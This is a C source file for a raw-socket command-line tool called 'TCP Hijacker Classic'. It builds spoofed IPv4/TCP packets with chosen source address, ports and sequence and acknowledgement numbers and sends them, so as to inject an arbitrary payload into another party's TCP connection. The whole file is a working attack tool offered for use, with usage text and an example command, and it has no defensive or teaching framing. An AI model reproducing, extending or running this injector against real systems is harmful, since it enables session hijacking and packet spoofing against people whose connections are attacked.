/*
 * TCP Hijacker Classic
 * Author: didiberman
 * Date: 2025-06-02
 * 
 * A raw socket-based TCP hijacker written in C.
 * Linux & FreeBSD compatible.
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <arpa/inet.h>
#include <errno.h>
#include <signal.h>
#include <time.h>

#define MAX_PAYLOAD 1024
#define VERSION "1.0.0"

// Global variables for cleanup
static int g_socket = -1;

// Pseudo header for TCP checksum
struct pseudo_header {
    uint32_t source_address;
    uint32_t dest_address;
    uint8_t placeholder;
    uint8_t protocol;
    uint16_t tcp_length;
};

// Connection state
struct tcp_conn {
    uint32_t src_ip;
    uint32_t dst_ip;
    uint16_t src_port;
    uint16_t dst_port;
    uint32_t seq;
    uint32_t ack;
    struct sockaddr_in dst_addr;
};

// Complete packet structure
struct packet {
    struct iphdr ip;
    struct tcphdr tcp;
    char payload[MAX_PAYLOAD];
};

// Function prototypes
void cleanup(void);
void signal_handler(int signo);
uint16_t calculate_checksum(unsigned short *ptr, int nbytes);
uint16_t tcp_checksum(struct packet *pkt, int plen, uint32_t src_addr, uint32_t dst_addr);
int craft_packet(struct packet *pkt, struct tcp_conn *conn, const char *data);
int hijack_connection(struct tcp_conn *conn, const char *payload);
int init_connection(struct tcp_conn *conn, const char *src_ip, const char *dst_ip,
                   uint16_t src_port, uint16_t dst_port,
                   uint32_t init_seq, uint32_t init_ack);
void print_packet_info(struct packet *pkt, int payload_len);
void usage(const char *progname);

// Signal handler for cleanup
void signal_handler(int signo) {
    printf("\nReceived signal %d. Cleaning up...\n", signo);
    cleanup();
    exit(1);
}

// Cleanup function
void cleanup(void) {
    if (g_socket != -1) {
        close(g_socket);
        g_socket = -1;
    }
}

// Calculate generic checksum
uint16_t calculate_checksum(unsigned short *ptr, int nbytes) {
    register long sum = 0;
    uint16_t oddbyte;
    
    while (nbytes > 1) {
        sum += *ptr++;
        nbytes -= 2;
    }
    
    if (nbytes == 1) {
        oddbyte = 0;
        *((uint8_t*)&oddbyte) = *(uint8_t*)ptr;
        sum += oddbyte;
    }
    
    sum = (sum >> 16) + (sum & 0xffff);
    sum = sum + (sum >> 16);
    
    return (uint16_t)~sum;
}

// Calculate TCP checksum
uint16_t tcp_checksum(struct packet *pkt, int plen, uint32_t src_addr, uint32_t dst_addr) {
    struct pseudo_header psh;
    char *pseudogram;
    uint16_t checksum;
    
    psh.source_address = src_addr;
    psh.dest_address = dst_addr;
    psh.placeholder = 0;
    psh.protocol = IPPROTO_TCP;
    psh.tcp_length = htons(sizeof(struct tcphdr) + plen);
    
    int psize = sizeof(struct pseudo_header) + sizeof(struct tcphdr) + plen;
    pseudogram = malloc(psize);
    
    if (pseudogram == NULL) {
        fprintf(stderr, "Memory allocation failed\n");
        return 0;
    }
    
    memcpy(pseudogram, &psh, sizeof(struct pseudo_header));
    memcpy(pseudogram + sizeof(struct pseudo_header), &pkt->tcp, sizeof(struct tcphdr) + plen);
    
    checksum = calculate_checksum((unsigned short*)pseudogram, psize);
    
    free(pseudogram);
    return checksum;
}

// Craft TCP packet
int craft_packet(struct packet *pkt, struct tcp_conn *conn, const char *data) {
    int payload_len = strlen(data);
    
    if (payload_len > MAX_PAYLOAD) {
        fprintf(stderr, "Payload too large (max %d bytes)\n", MAX_PAYLOAD);
        return -1;
    }
    
    // IP Header
    memset(pkt, 0, sizeof(struct packet));
    pkt->ip.version = 4;
    pkt->ip.ihl = 5;
    pkt->ip.tos = 0;
    pkt->ip.tot_len = sizeof(struct iphdr) + sizeof(struct tcphdr) + payload_len;
    pkt->ip.id = htons(rand() & 0xFFFF);
    pkt->ip.frag_off = 0;
    pkt->ip.ttl = 64;
    pkt->ip.protocol = IPPROTO_TCP;
    pkt->ip.saddr = conn->src_ip;
    pkt->ip.daddr = conn->dst_ip;
    pkt->ip.check = 0;
    
    // TCP Header
    pkt->tcp.source = htons(conn->src_port);
    pkt->tcp.dest = htons(conn->dst_port);
    pkt->tcp.seq = htonl(conn->seq);
    pkt->tcp.ack_seq = htonl(conn->ack);
    pkt->tcp.doff = 5;
    pkt->tcp.fin = 0;
    pkt->tcp.syn = 0;
    pkt->tcp.rst = 0;
    pkt->tcp.psh = 1;
    pkt->tcp.ack = 1;
    pkt->tcp.urg = 0;
    pkt->tcp.window = htons(5840);
    pkt->tcp.check = 0;
    pkt->tcp.urg_ptr = 0;
    
    // Copy payload
    memcpy(pkt->payload, data, payload_len);
    
    // Calculate checksums
    pkt->tcp.check = tcp_checksum(pkt, payload_len, pkt->ip.saddr, pkt->ip.daddr);
    pkt->ip.check = calculate_checksum((unsigned short *)&pkt->ip, sizeof(struct iphdr));
    
    return payload_len;
}

// Print packet information
void print_packet_info(struct packet *pkt, int payload_len) {
    char src_ip[INET_ADDRSTRLEN], dst_ip[INET_ADDRSTRLEN];
    
    inet_ntop(AF_INET, &(pkt->ip.saddr), src_ip, INET_ADDRSTRLEN);
    inet_ntop(AF_INET, &(pkt->ip.daddr), dst_ip, INET_ADDRSTRLEN);
    
    printf("\nPacket Details:\n");
    printf("---------------\n");
    printf("Source IP: %s\n", src_ip);
    printf("Dest IP: %s\n", dst_ip);
    printf("Source Port: %d\n", ntohs(pkt->tcp.source));
    printf("Dest Port: %d\n", ntohs(pkt->tcp.dest));
    printf("Sequence: %u\n", ntohl(pkt->tcp.seq));
    printf("Acknowledge: %u\n", ntohl(pkt->tcp.ack_seq));
    printf("Payload Length: %d bytes\n", payload_len);
    printf("TCP Checksum: 0x%04x\n", ntohs(pkt->tcp.check));
    printf("IP Checksum: 0x%04x\n", ntohs(pkt->ip.check));
}

// Initialize connection tracking
int init_connection(struct tcp_conn *conn, 
                   const char *src_ip, const char *dst_ip,
                   uint16_t src_port, uint16_t dst_port,
                   uint32_t init_seq, uint32_t init_ack) {
    
    if (inet_pton(AF_INET, src_ip, &conn->src_ip) != 1) {
        fprintf(stderr, "Invalid source IP address: %s\n", src_ip);
        return -1;
    }
    
    if (inet_pton(AF_INET, dst_ip, &conn->dst_ip) != 1) {
        fprintf(stderr, "Invalid destination IP address: %s\n", dst_ip);
        return -1;
    }
    
    conn->src_port = src_port;
    conn->dst_port = dst_port;
    conn->seq = init_seq;
    conn->ack = init_ack;
    
    conn->dst_addr.sin_family = AF_INET;
    conn->dst_addr.sin_port = htons(dst_port);
    conn->dst_addr.sin_addr.s_addr = conn->dst_ip;
    
    return 0;
}

// Main hijacking function
int hijack_connection(struct tcp_conn *conn, const char *payload) {
    struct packet pkt;
    int payload_len;
    int one = 1;
    
    // Create raw socket
    if ((g_socket = socket(AF_INET, SOCK_RAW, IPPROTO_TCP)) < 0) {
        perror("Socket creation failed");
        return -1;
    }
    
    // Set IP_HDRINCL
    if (setsockopt(g_socket, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one)) < 0) {
        perror("setsockopt(IP_HDRINCL) failed");
        cleanup();
        return -1;
    }
    
    // Craft the packet
    if ((payload_len = craft_packet(&pkt, conn, payload)) < 0) {
        fprintf(stderr, "Failed to craft packet\n");
        cleanup();
        return -1;
    }
    
    // Print packet information
    print_packet_info(&pkt, payload_len);
    
    // Send the packet
    int total_len = sizeof(struct iphdr) + sizeof(struct tcphdr) + payload_len;
    if (sendto(g_socket, &pkt, total_len, 0, 
               (struct sockaddr *)&conn->dst_addr, 
               sizeof(struct sockaddr)) < 0) {
        perror("sendto() failed");
        cleanup();
        return -1;
    }
    
    printf("\nPacket sent successfully!\n");
    cleanup();
    return 0;
}

void usage(const char *progname) {
    printf("TCP Hijacker Classic v%s\n", VERSION);
    printf("Usage: %s <src_ip> <dst_ip> <src_port> <dst_port> <seq> <ack> <payload>\n\n", progname);
    printf("Arguments:\n");
    printf("  src_ip    Source IP address\n");
    printf("  dst_ip    Destination IP address\n");
    printf("  src_port  Source port number\n");
    printf("  dst_port  Destination port number\n");
    printf("  seq       Initial sequence number\n");
    printf("  ack       Initial acknowledgment number\n");
    printf("  payload   Data to send (use quotes for spaces)\n\n");
    printf("Example:\n");
    printf("  %s 192.168.1.2 192.168.1.3 1234 80 1000 2000 \"GET / HTTP/1.1\\r\\n\\r\\n\"\n\n", progname);
    printf("Note: This program requires root privileges to run\n");
}

int main(int argc, char *argv[]) {
    if (argc != 8) {
        usage(argv[0]);
        return 1;
    }
    
    // Check for root privileges
    if (getuid() != 0) {
        fprintf(stderr, "Error: This program must be run as root\n");
        return 1;
    }
    
    // Set up signal handlers
    signal(SIGINT, signal_handler);
    signal(SIGTERM, signal_handler);
    
    // Initialize random number generator
    srand(time(NULL));
    
    struct tcp_conn conn;
    
    // Initialize connection
    if (init_connection(&conn, argv[1], argv[2], 
                       (uint16_t)atoi(argv[3]), 
                       (uint16_t)atoi(argv[4]),
                       (uint32_t)strtoul(argv[5], NULL, 10),
                       (uint32_t)strtoul(argv[6], NULL, 10)) < 0) {
        fprintf(stderr, "Failed to initialize connection\n");
        return 1;
    }
    
    // Perform the hijacking
    if (hijack_connection(&conn, argv[7]) < 0) {
        fprintf(stderr, "Hijacking failed\n");
        return 1;
    }
    
    return 0;
}
